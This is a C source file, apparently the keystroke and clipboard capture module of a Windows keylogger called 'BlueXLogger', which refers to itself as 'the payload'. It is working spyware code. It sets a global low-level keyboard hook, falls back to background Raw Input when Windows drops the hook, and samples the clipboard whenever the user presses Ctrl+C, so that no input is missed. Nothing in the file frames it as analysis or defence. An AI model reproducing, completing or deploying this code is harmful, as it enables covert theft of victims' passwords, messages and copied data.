/*============================================================================
 * BlueXLogger - bxl_capture.c
 * Low-level keyboard capture with a Raw Input fallback path.
 *
 * Created by Xencode-CLI by xanthorox
 *==========================================================================*/
#include "bxl_capture.h"
#include "bxl_util.h"

static const wchar_t k_capture_class[] = L"BlueXLoggerCaptureWnd";

/* The hook procedure is a free function with no user-data parameter, so the
 * single capture instance is published here. The payload runs exactly one
 * capture engine, and this is written before the hook is installed. */
static BxlCapture *g_capture = NULL;

/*==========================================================================
 * Ring buffer
 *========================================================================*/
static int ring_push(BxlCapture *c, const BxlKeyEvent *ev)
{
    LONG head, next;

    EnterCriticalSection(&c->cs);
    head = c->q_head;
    next = (head + 1) % BXL_CAP_QUEUE;

    if (next == c->q_tail) {
        /* Queue full - drop rather than block the hook. */
        c->q_dropped++;
        LeaveCriticalSection(&c->cs);
        return BXL_FALSE;
    }

    c->q[head] = *ev;
    c->q_head = next;
    LeaveCriticalSection(&c->cs);

    if (c->data_evt) SetEvent(c->data_evt);
    return BXL_TRUE;
}

int bxl_capture_drain(BxlCapture *c, BxlKeyEvent *evs, int max)
{
    int n = 0;

    if (!c || !evs || max <= 0) return 0;

    EnterCriticalSection(&c->cs);
    while (n < max && c->q_tail != c->q_head) {
        evs[n++] = c->q[c->q_tail];
        c->q_tail = (c->q_tail + 1) % BXL_CAP_QUEUE;
    }
    LeaveCriticalSection(&c->cs);

    return n;
}

int bxl_capture_take_clipboard_request(BxlCapture *c)
{
    if (!c) return 0;
    return (int)InterlockedExchange(&c->clipboard_request, 0);
}

int bxl_capture_hook_is_dead(const BxlCapture *c)
{
    return (c && c->hook_dead) ? BXL_TRUE : BXL_FALSE;
}

void bxl_capture_stats(const BxlCapture *c, unsigned *hook_events,
                       unsigned *raw_events, unsigned *dropped)
{
    if (!c) return;
    if (hook_events) *hook_events = (unsigned)c->hook_count;
    if (raw_events)  *raw_events  = (unsigned)c->raw_count;
    if (dropped)     *dropped     = (unsigned)c->q_dropped;
}

HANDLE bxl_capture_event(const BxlCapture *c)
{
    return c ? c->data_evt : NULL;
}

/*==========================================================================
 * Clipboard
 *========================================================================*/
int bxl_read_clipboard(char *out, size_t out_cch)
{
    int   opened = 0;
    int   attempt;
    int   ok = BXL_FALSE;

    if (!out || out_cch < 2) return BXL_FALSE;
    out[0] = '\0';

    /* The clipboard is a shared resource; retry briefly instead of giving up. */
    for (attempt = 0; attempt < 5 && !opened; attempt++) {
        if (OpenClipboard(NULL)) opened = 1;
        else Sleep(20);
    }
    if (!opened) return BXL_FALSE;

    if (IsClipboardFormatAvailable(CF_UNICODETEXT)) {
        HANDLE h = GetClipboardData(CF_UNICODETEXT);
        if (h) {
            const wchar_t *w = (const wchar_t *)GlobalLock(h);
            if (w) {
                if (bxl_wide_to_utf8(w, out, out_cch)) {
                    /* Collapse newlines so the log stays line-oriented. */
                    char *p;
                    for (p = out; *p; p++)
                        if (*p == '\r' || *p == '\n') *p = ' ';
                    ok = BXL_TRUE;
                }
                GlobalUnlock(h);
            }
        }
    } else if (IsClipboardFormatAvailable(CF_TEXT)) {
        HANDLE h = GetClipboardData(CF_TEXT);
        if (h) {
            const char *a = (const char *)GlobalLock(h);
            if (a) {
                bxl_str_copy(out, out_cch, a);
                ok = BXL_TRUE;
                GlobalUnlock(h);
            }
        }
    }

    CloseClipboard();
    return ok;
}

/*==========================================================================
 * Raw Input
 *========================================================================*/
static void handle_raw_input(BxlCapture *c, LPARAM lParam)
{
    RAWINPUT ri;
    UINT     size = sizeof(ri);
    UINT     got;

    got = GetRawInputData((HRAWINPUT)lParam, RID_INPUT, &ri, &size,
                          sizeof(RAWINPUTHEADER));
    if (got == (UINT)-1 || got != size) return;
    if (ri.header.dwType != RIM_TYPEKEYBOARD) return;

    InterlockedExchange(&c->last_raw_ms, (LONG)GetTickCount());
    c->raw_count++;

    /* The hook is authoritative while it is alive; raw input only takes over
     * once the hook has gone quiet, so keystrokes are never logged twice.
     *
     * The decision is made here rather than left to the once-a-second timer.
     * Windows silently removes a low-level hook that exceeds the
     * LowLevelHooksTimeout, and the usual trigger is the machine being idle
     * while the user is away. If takeover waited for the timer, every
     * keystroke typed between the hook dying and the next tick would be
     * dropped - the hook is gone, so nothing sets hook_dead, and raw input
     * would still be deferring to it. A hook that has been silent for longer
     * than the dead threshold is not coming back on its own, and a live hook
     * cannot be silent for that long while the user is actually typing. */
    if (!c->hook_dead) {
        DWORD now  = GetTickCount();
        DWORD last = (DWORD)c->last_hook_ms;

        if (last != 0 && (DWORD)(now - last) <= BXL_HOOK_DEAD_MS) return;

        InterlockedExchange(&c->hook_dead, 1);
        bxl_logf("capture: hook silent for %lu ms - using raw input",
                 (unsigned long)(last ? now - last : 0));
    }

    if (ri.data.keyboard.VKey == 0xFF) return;   /* fake key for Ctrl+Numpad */

    {
        BxlKeyEvent ev;
        memset(&ev, 0, sizeof(ev));
        ev.vk       = ri.data.keyboard.VKey;
        ev.scan     = ri.data.keyboard.MakeCode;
        ev.extended = (ri.data.keyboard.Flags & RI_KEY_E0) ? 1 : 0;
        ev.is_down  = (ri.data.keyboard.Flags & RI_KEY_BREAK) ? 0 : 1;
        ev.injected = 0;
        ring_push(c, &ev);
    }
}

/*==========================================================================
 * Dead-key detection
 *
 * A dead key produces no character of its own; ToUnicodeEx reports it by
 * returning -1. This matters because four VK codes double as ordinary OEM
 * punctuation (0xBD/0xBE/0xBF/0xC0 are '-' '.' '/' '`' on a US layout and the
 * acute/circumflex/tilde/grave dead keys on US-International), so the layout
 * is the only thing that can tell them apart.
 *
 * The layout's dead-key buffer is per-thread. This hook thread does no other
 * input work, so nothing the user is typing is disturbed; the buffer is
 * flushed below so consecutive taps stay independent.
 *========================================================================*/
static int hook_key_is_dead(bxl_u16 vk, bxl_u16 scan)
{
    static const BYTE k_mods[] = {
        VK_SHIFT, VK_LSHIFT, VK_RSHIFT, VK_CONTROL, VK_LCONTROL,
        VK_RCONTROL, VK_MENU, VK_LMENU, VK_RMENU, VK_CAPITAL
    };
    BYTE  ks[256];
    WCHAR buf[8];
    HKL   layout;
    size_t i;
    int   r;

    memset(ks, 0, sizeof(ks));
    for (i = 0; i < BXL_COUNT_OF(k_mods); i++)
        if (GetAsyncKeyState(k_mods[i]) & 0x8000)
            ks[k_mods[i]] = 0x80;

    layout = GetKeyboardLayout(0);
    r = ToUnicodeEx(vk, scan, ks, buf, BXL_COUNT_OF(buf), 0, layout);
    if (r != -1) return 0;

    /* Disarm: feeding VK_SPACE consumes the pending dead character. */
    ToUnicodeEx(VK_SPACE, 0, ks, buf, BXL_COUNT_OF(buf), 0, layout);
    return 1;
}

/*==========================================================================
 * Low-level keyboard hook
 *========================================================================*/
static LRESULT CALLBACK low_level_proc(int nCode, WPARAM wParam, LPARAM lParam)
{
    BxlCapture *c;

    if (nCode == HC_ACTION) {
        const KBDLLHOOKSTRUCT *k = (const KBDLLHOOKSTRUCT *)lParam;

        /* Hook procedures receive no user-data pointer; the capture instance
         * is published in a file-static before the hook is installed. */
        c = g_capture;

        if (c && k) {
            BxlKeyEvent ev;
            memset(&ev, 0, sizeof(ev));

            ev.vk       = (bxl_u16)k->vkCode;
            ev.scan     = (bxl_u16)k->scanCode;
            ev.extended = (k->flags & LLKHF_EXTENDED) ? 1 : 0;
            ev.injected = (k->flags & (LLKHF_INJECTED | LLKHF_LOWER_IL_INJECTED))
                        ? 1 : 0;

            switch (wParam) {
            case WM_KEYDOWN:
            case WM_SYSKEYDOWN:
                ev.is_down = 1;
                ev.is_dead = (bxl_u8)hook_key_is_dead(ev.vk, ev.scan);
                break;
            case WM_KEYUP:
            case WM_SYSKEYUP:
                ev.is_down = 0;
                break;
            default:
                return CallNextHookEx(NULL, nCode, wParam, lParam);
            }

            InterlockedExchange(&c->last_hook_ms, (LONG)GetTickCount());
            if (c->hook_dead) {
                InterlockedExchange(&c->hook_dead, 0);
                bxl_logf("capture: low-level hook is alive again");
            }
            c->hook_count++;

            /* Ctrl+C: ask the worker to sample the clipboard. */
            if (ev.is_down && ev.vk == 'C' &&
                (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
                InterlockedExchange(&c->clipboard_request, 1);
            }

            ring_push(c, &ev);
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/*==========================================================================
 * Capture thread
 *========================================================================*/
static LRESULT CALLBACK capture_wnd_proc(HWND hwnd, UINT msg,
                                         WPARAM wParam, LPARAM lParam)
{
    BxlCapture *c = (BxlCapture *)GetWindowLongPtrW(hwnd, GWLP_USERDATA);

    switch (msg) {
    case WM_INPUT:
        if (c) handle_raw_input(c, lParam);
        return DefWindowProcW(hwnd, msg, wParam, lParam);

    case WM_TIMER:
        if (c && c->hook) {
            DWORD now = GetTickCount();
            DWORD last = (DWORD)c->last_hook_ms;

            /* Only declare the hook dead if raw input is actually flowing -
             * otherwise an idle desktop would look like a dead hook. */
            if (c->enable_raw && !c->hook_dead &&
                (DWORD)(now - last) > BXL_HOOK_DEAD_MS &&
                c->last_raw_ms != 0 &&
                (DWORD)(now - (DWORD)c->last_raw_ms) < BXL_HOOK_DEAD_MS) {
                InterlockedExchange(&c->hook_dead, 1);
                bxl_logf("capture: hook silent for %lu ms - using raw input",
                         (unsigned long)(now - last));
            }
        }
        return 0;

    default:
        break;
    }

    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

static DWORD WINAPI capture_thread_proc(LPVOID param)
{
    BxlCapture *c = (BxlCapture *)param;
    WNDCLASSEXW wc;
    MSG         msg;

    g_capture = c;

    memset(&wc, 0, sizeof(wc));
    wc.cbSize        = sizeof(wc);
    wc.lpfnWndProc   = capture_wnd_proc;
    wc.hInstance     = c->hinst;
    wc.lpszClassName = k_capture_class;
    RegisterClassExW(&wc);   /* harmless if it already exists */

    c->msg_hwnd = CreateWindowExW(0, k_capture_class, L"", 0,
                                  0, 0, 0, 0, HWND_MESSAGE, NULL,
                                  c->hinst, NULL);
    if (!c->msg_hwnd) {
        bxl_logf("capture: message window creation failed (%lu)", GetLastError());
        SetEvent(c->ready_evt);
        return 1;
    }
    SetWindowLongPtrW(c->msg_hwnd, GWLP_USERDATA, (LONG_PTR)c);

    c->hook = SetWindowsHookExW(WH_KEYBOARD_LL, low_level_proc, c->hinst, 0);
    if (!c->hook) {
        bxl_logf("capture: SetWindowsHookEx failed (%lu)", GetLastError());
    } else {
        InterlockedExchange(&c->last_hook_ms, (LONG)GetTickCount());
    }

    if (c->enable_raw) {
        RAWINPUTDEVICE rid;
        rid.usUsagePage = 0x01;   /* Generic Desktop */
        rid.usUsage     = 0x06;   /* Keyboard        */
        rid.dwFlags     = RIDEV_INPUTSINK;
        rid.hwndTarget  = c->msg_hwnd;
        c->raw_registered = RegisterRawInputDevices(&rid, 1, sizeof(rid))
                          ? 1 : 0;
        if (!c->raw_registered)
            bxl_logf("capture: RegisterRawInputDevices failed (%lu)",
                     GetLastError());
    }

    SetTimer(c->msg_hwnd, 1, 1000, NULL);
    SetEvent(c->ready_evt);

    while (GetMessageW(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    if (c->hook) {
        UnhookWindowsHookEx(c->hook);
        c->hook = NULL;
    }
    if (c->raw_registered) {
        RAWINPUTDEVICE rid;
        rid.usUsagePage = 0x01;
        rid.usUsage     = 0x06;
        rid.dwFlags     = RIDEV_REMOVE;
        rid.hwndTarget  = NULL;
        RegisterRawInputDevices(&rid, 1, sizeof(rid));
        c->raw_registered = 0;
    }
    if (c->msg_hwnd) {
        KillTimer(c->msg_hwnd, 1);
        DestroyWindow(c->msg_hwnd);
        c->msg_hwnd = NULL;
    }

    g_capture = NULL;
    return 0;
}

/*==========================================================================
 * Public lifecycle
 *========================================================================*/
int bxl_capture_start(BxlCapture *c, int enable_raw)
{
    if (!c) return BXL_FALSE;

    memset(c, 0, sizeof(*c));
    InitializeCriticalSection(&c->cs);
    c->hinst      = GetModuleHandleW(NULL);
    c->enable_raw = enable_raw ? 1 : 0;

    c->ready_evt = CreateEventW(NULL, TRUE,  FALSE, NULL);
    c->data_evt  = CreateEventW(NULL, FALSE, FALSE, NULL);
    c->stop_evt  = CreateEventW(NULL, TRUE,  FALSE, NULL);

    if (!c->ready_evt || !c->data_evt || !c->stop_evt) {
        bxl_logf("capture: event creation failed");
        goto fail;
    }

    c->thread = CreateThread(NULL, 0, capture_thread_proc, c, 0, &c->thread_id);
    if (!c->thread) {
        bxl_logf("capture: thread creation failed (%lu)", GetLastError());
        goto fail;
    }

    WaitForSingleObject(c->ready_evt, 10000);
    c->running = 1;

    if (!c->hook) {
        bxl_logf("capture: hook not installed; raw input is the only path");
        if (!c->raw_registered) {
            bxl_capture_stop(c);
            return BXL_FALSE;
        }
    }
    return BXL_TRUE;

fail:
    if (c->ready_evt) CloseHandle(c->ready_evt);
    if (c->data_evt)  CloseHandle(c->data_evt);
    if (c->stop_evt)  CloseHandle(c->stop_evt);
    DeleteCriticalSection(&c->cs);
    memset(c, 0, sizeof(*c));
    return BXL_FALSE;
}

void bxl_capture_stop(BxlCapture *c)
{
    if (!c) return;

    if (c->thread) {
        if (c->thread_id) PostThreadMessageW(c->thread_id, WM_QUIT, 0, 0);
        if (WaitForSingleObject(c->thread, 5000) != WAIT_OBJECT_0)
            bxl_logf("capture: thread did not exit cleanly");
        CloseHandle(c->thread);
        c->thread = NULL;
    }

    if (c->ready_evt) CloseHandle(c->ready_evt);
    if (c->data_evt)  CloseHandle(c->data_evt);
    if (c->stop_evt)  CloseHandle(c->stop_evt);
    c->ready_evt = c->data_evt = c->stop_evt = NULL;

    if (c->running) DeleteCriticalSection(&c->cs);
    c->running = 0;
}
